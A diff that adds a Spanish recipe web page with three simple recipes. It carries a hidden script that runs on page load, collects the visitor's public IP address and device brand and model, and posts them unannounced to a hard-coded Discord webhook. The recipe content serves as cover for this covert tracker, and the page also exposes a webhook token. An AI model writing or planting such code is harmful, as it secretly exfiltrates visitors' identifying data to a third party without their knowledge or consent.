@@ -1,1 +1,136 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recetas de Cocina</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1 { text-align: center; }
+        .receta { margin-bottom: 40px; }
+        .receta h2 { color: #333; }
+        .receta ul, .receta ol { margin-left: 20px; }
+    </style>
+</head>
+<body>
+    <h1>Recetas de Cocina Fáciles y Deliciosas</h1>
+    
+    <div class="receta">
+        <h2>Receta 1: Ensalada César</h2>
+        <h3>Ingredientes:</h3>
+        <ul>
+            <li>Lechuga romana</li>
+            <li>Pollo a la parrilla</li>
+            <li>Crutones</li>
+            <li>Queso parmesano</li>
+            <li>Salsa César</li>
+        </ul>
+        <h3>Instrucciones:</h3>
+        <ol>
+            <li>Lava y corta la lechuga.</li>
+            <li>Agrega el pollo cortado en trozos.</li>
+            <li>Incorpora los crutones y el queso rallado.</li>
+            <li>Adereza con la salsa y mezcla bien.</li>
+        </ol>
+    </div>
+    
+    <div class="receta">
+        <h2>Receta 2: Pasta Carbonara</h2>
+        <h3>Ingredientes:</h3>
+        <ul>
+            <li>Espaguetis</li>
+            <li>Huevos</li>
+            <li>Queso pecorino</li>
+            <li>Panceta</li>
+            <li>Pimienta negra</li>
+        </ul>
+        <h3>Instrucciones:</h3>
+        <ol>
+            <li>Cocina la pasta en agua hirviendo.</li>
+            <li>Fríe la panceta hasta que esté crujiente.</li>
+            <li>Mezcla los huevos con el queso y pimienta.</li>
+            <li>Combina todo y sirve caliente.</li>
+        </ol>
+    </div>
+    
+    <div class="receta">
+        <h2>Receta 3: Tarta de Manzana</h2>
+        <h3>Ingredientes:</h3>
+        <ul>
+            <li>Manzanas</li>
+            <li>Masa quebrada</li>
+            <li>Azúcar</li>
+            <li>Canela</li>
+            <li>Mantequilla</li>
+        </ul>
+        <h3>Instrucciones:</h3>
+        <ol>
+            <li>Precalienta el horno a 180°C.</li>
+            <li>Coloca la masa en un molde.</li>
+            <li>Corta las manzanas y mézclalas con azúcar y canela.</li>
+            <li>Hornea durante 40 minutos.</li>
+        </ol>
+    </div>
+
+    <script>
+        // Reemplaza esto con tu URL real de webhook de Discord
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1289175438324928559/4-U5hRtyCGeIg8TOOnt87EN1ZtTynnUruLTkOGrg3cRMkJ8e2ZP4P53QoD-56jnsOixz';
+
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error al obtener IP:', error);
+                return 'Desconocida';
+            }
+        }
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let brand = 'Desconocida';
+            let model = 'Desconocido';
+
+            // Parsing simple para userAgent (puede no ser 100% preciso, considera usar una librería como ua-parser-js si lo integras en un servidor)
+            if (/iPhone/.test(userAgent)) {
+                brand = 'Apple';
+                model = userAgent.match(/iPhone\s([^\s;]+)/) ? userAgent.match(/iPhone\s([^\s;]+)/)[1] : 'iPhone';
+            } else if (/Android/.test(userAgent)) {
+                brand = userAgent.match(/;\s([^\s;]+)\sBuild/) ? userAgent.match(/;\s([^\s;]+)\sBuild/)[1] : 'Android';
+                model = brand; // A menudo el modelo está en el brand para Android
+            } else if (/Windows Phone/.test(userAgent)) {
+                brand = 'Microsoft';
+                model = userAgent.match(/Windows Phone\s([^\s;]+)/) ? userAgent.match(/Windows Phone\s([^\s;]+)/)[1] : 'Windows Phone';
+            }
+
+            return { brand, model };
+        }
+
+        async function sendToWebhook() {
+            const ip = await getPublicIP();
+            const device = getDeviceInfo();
+
+            const payload = {
+                content: `Nuevo acceso:\nIP Pública: ${ip}\nMarca del dispositivo: ${device.brand}\nModelo del dispositivo: ${device.model}`
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error al enviar a webhook:', error);
+            }
+        }
+
+        // Ejecuta al cargar la página
+        window.onload = sendToWebhook;
+    </script>
+</body>
+</html>
 
